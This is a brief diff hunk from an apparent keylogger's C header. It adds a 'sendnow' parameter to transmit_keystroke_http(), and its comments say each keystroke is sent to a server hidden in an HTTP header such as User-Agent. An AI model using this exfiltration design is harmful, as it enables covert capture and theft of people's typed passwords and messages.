@@ -209,7 +209,7 @@ void		clean_exit		(struct config_struct* cfg);
  * sent as value of a HTTP header field (HTTP_HEADER_FIELD, default is User-
  * Agent).
  * */
-int			transmit_keystroke_http(char* key, struct config_struct *cfg);
+int			transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow);
 /* curl_blackhole()
  * This is just a dummy write-handler, in order to prevent libcurl from
  * printing the web-server response. 
